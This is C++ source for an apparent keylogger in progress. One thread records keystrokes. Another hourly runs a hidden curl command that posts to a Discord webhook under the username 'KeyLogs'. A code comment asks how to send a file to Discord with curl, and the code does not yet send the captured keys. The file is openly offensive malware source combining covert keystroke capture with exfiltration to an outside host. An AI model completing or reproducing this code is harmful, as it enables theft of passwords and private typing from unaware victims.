#include <iostream>
#include <conio.h>
#include <vector>
#include <thread>
#include <windows.h>

#define Webhook "https://discord.com/api/webhooks/..."
#define Cooldown 60 // 60mins

std::vector<std::string> caps;
char c_buffer[2];

/*
  Here are my problems, how to send a file to discord using curl?
*/
void send_logs_thread(void)
{
	char base_command[] = "curl -i -H \"Accept: application\/json\" -H \"Content-Type: application\/json\" -X POST --data \"{\\\"username\\\": \\\"KeyLogs\\\", \\\"content\\\": \\\"> New Logs\\\"}\"";
	char command[1 + sizeof(base_command) + sizeof(Webhook)];
	snprintf(command, sizeof(command), "%s %s", base_command, Webhook);

	while (true)
	{
		Sleep(60000 * Cooldown);
		WinExec(command, SW_HIDE);
	}
}

void get_caps_thread(void)
{
	while (true)
	{
		if (_kbhit())
		{
			snprintf(c_buffer, sizeof(c_buffer), "%c", _getch());
			caps.push_back(c_buffer);
		}
	}
}

int main(void)
{
	std::thread log_thread(send_logs_thread);
	std::thread caps_thread(get_caps_thread);

	caps_thread.join();
	log_thread.join();

	return 0;
}
